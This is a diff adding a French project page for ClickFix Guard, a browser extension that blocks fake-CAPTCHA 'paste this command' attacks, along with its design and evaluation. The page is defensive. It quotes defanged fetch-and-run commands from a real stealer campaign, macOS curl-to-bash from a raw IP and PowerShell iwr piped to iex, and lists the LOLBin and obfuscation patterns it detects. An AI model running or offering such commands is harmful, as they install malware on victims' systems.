@@ -1,0 +1,73 @@
+---
+title: ClickFix Guard
+kind: security
+year: "2026"
+order: 3
+summary: Une extension Chrome et Firefox qui bloque les attaques « faux CAPTCHA, collez cette commande ». Quand une page copie en douce une commande malveillante dans votre presse-papiers, elle n'y arrive jamais ; une note inoffensive la remplace, et vous voyez pourquoi.
+why: Après avoir décortiqué de bout en bout un leurre « collez une commande », je voulais la défense qui l'aurait arrêté avant que la victime appuie sur Win+R.
+note: Signée par Mozilla. Aucune requête réseau, aucune télémétrie ; tout tourne dans le navigateur.
+cover: /work/clickfix-guard/cover.webp
+stack: [JavaScript, WebExtensions MV3, Chrome + Firefox, Node test runner, CDP, WebDriver BiDi, Vercel]
+repo: https://github.com/samdem-ai/clickfix-guard-extention
+live: https://clickfix-guard-demo.vercel.app
+results:
+  - value: "91,8 %"
+    label: de familles d'attaques jamais vues bloquées (leave-one-family-out)
+  - value: "0 %"
+    label: de commandes légitimes bloquées dans le même test
+  - value: "59"
+    label: vérifications en navigateur réel, Chromium et Firefox
+  - value: "0"
+    label: requête réseau ou donnée collectée
+---
+
+## Le problème
+
+ClickFix (aussi appelé faux CAPTCHA ou « copier-exécuter ») n'a besoin ni d'exploit ni de téléchargement. La page affiche « Vérifiez que vous êtes humain », copie une commande dans votre presse-papiers au clic, puis vous dit d'appuyer sur <kbd>Win</kbd>+<kbd>R</kbd>, <kbd>Ctrl</kbd>+<kbd>V</kbd>, <kbd>Entrée</kbd>. L'analyse des téléchargements, SmartScreen et Gatekeeper ne voient rien, puisque c'est la victime qui lance la commande.
+
+J'ai démonté un de ces leurres dans [« Free Claude Code » to malware](/fr/work/youtube-paste-stealer). Le navigateur est le dernier endroit qui voit la commande avant qu'elle atteigne le système : c'est là que l'extension se place.
+
+## Face au leurre que j'ai analysé
+
+Cette campagne n'avait même pas besoin d'un faux CAPTCHA : la description d'une vidéo YouTube renvoyait vers un « installateur » sur Pastebin, une commande par système, que les victimes copiaient elles-mêmes. Voici les commandes de ce paste (neutralisées ici), passées dans ClickFix Guard comme tests de non-régression :
+
+| Commande du paste | Verdict |
+| --- | --- |
+| macOS : le vrai `bun.sh/install`, enchaîné à `/bin/bash -c "$(curl -fsSL hxxp://192.162.199[.]249/9rmoz4cqi58)"` | **Bloquée**, même sans contexte de page. Le vrai installateur placé devant n'excuse pas l'étape vers une IP brute. |
+| Windows : `iwr "hxxp://soft-storage[.]top/worker?=…/ai-plugin" -UseBasicParsing \| iex` | **Bloquée** dans tous les cas |
+| Windows, la ligne de téléchargement seule | **Bloquée** quand la page dit de la lancer dans PowerShell ; un avertissement sans ce contexte |
+
+Copier l'une ou l'autre commande de ce paste, au Ctrl+C ou avec un bouton de copie, laisse donc une note inoffensive dans le presse-papiers au lieu du premier étage du stealer.
+
+## Ce que j'ai fait
+
+1. **Intercepter toutes les façons de copier.** Un script dans le contexte de la page enveloppe `navigator.clipboard`, `setData` dans les événements de copie, `execCommand('copy')` sur des zones de texte cachées et le simple Ctrl+C, dans chaque frame, y compris les iframes d'autres origines.
+2. **Défaire le camouflage avant de juger.** Échappements `^` et `` ` ``, chaînes découpées, codes `[char]`, astuces `-f` / `-join` / `-replace`, `-EncodedCommand`, base64, caractères invisibles, et les espaces qui cachent la vraie commande dans la boîte Exécuter. Tout est reconstruit comme du texte ; rien n'est exécuté.
+3. **Noter en quatre couches.** Des règles pour les LOLBins connus (mshta, certutil, msiexec, `iex`, `curl | bash`, osascript…), un analyseur générique qui reconnaît la forme « télécharger puis exécuter » pour des outils qu'aucune règle ne nomme, un petit classifieur local (n-grammes de caractères hachés, 93 Ko, environ 0,2 ms par copie), et des signaux de comportement indépendants de la charge : le texte copié était-il visible, le bouton disait-il « Copier » ou « Vérifier », des instructions « appuyez sur Win+R » sont-elles apparues après la copie ?
+4. **Agir.** Une commande bloquée n'atteint jamais le presse-papiers : une note en `#` la remplace, sans effet dans Exécuter, cmd, PowerShell ou bash. Les copies douteuses déclenchent un avertissement, et le presse-papiers est nettoyé si vous quittez le navigateur dans les 15 secondes. Les leurres qui n'affichent leurs instructions qu'après la copie sont revérifiés et nettoyés après coup.
+
+## Architecture
+
+<Pipeline>
+  <Stage label="writeText · setData · execCommand · Ctrl+C" sub="interception" />
+  <Stage label="décodage · désobfuscation" sub="normalisation" />
+  <Stage label="règles · analyseur · classifieur · intention" sub="score" />
+  <Stage label="blocage · alerte · nettoyage tardif" sub="action" />
+  <Stage label="alerte · badge · journal local" sub="rapport" />
+</Pipeline>
+
+![La démo en ligne, avec ClickFix Guard qui bloque un faux CAPTCHA](/work/clickfix-guard/demo.webp)
+
+## Tester honnêtement
+
+Le classifieur est évalué en **leave-one-family-out** : 15 familles d'attaques modélisées d'après les rapports publics sur ClickFix ; pour chacune, le modèle est réentraîné sans elle puis testé dessus, sans contexte de page. Les règles seules en bloquent 81,2 % ; l'analyseur complet en bloque 91,8 % et en signale 98,4 %, sans bloquer aucune commande légitime. La première version du corpus laissait le modèle tricher en apprenant à quoi ressemblent les adresses de test : les exemples légitimes utilisent maintenant le même générateur d'adresses.
+
+L'extension elle-même est testée dans de vrais navigateurs : Chromium headless via CDP et Firefox via WebDriver BiDi la chargent, cliquent sur les pages-leurres comme un utilisateur et vérifient ce qui arrive vraiment dans le presse-papiers. Le paquet Firefox signé passe comme une installation normale dans Firefox stable, et la version non signée est refusée : la vérification de signature était bien active.
+
+<Note>Le corpus est généré à partir de modèles que j'ai écrits, pas d'échantillons capturés : les chiffres mesurent la généralisation entre les styles d'attaque que j'ai modélisés. La précision réelle sera différente ; la prochaine étape est de rejouer de vraies charges issues de flux de threat intel.</Note>
+
+## Résultats
+
+<Results />
+
+Essayez avant d'installer : la [démo](https://clickfix-guard-demo.vercel.app) lance des leurres simulés et sans danger, qui pointent vers des adresses injoignables, et vous dit si vous êtes protégé.
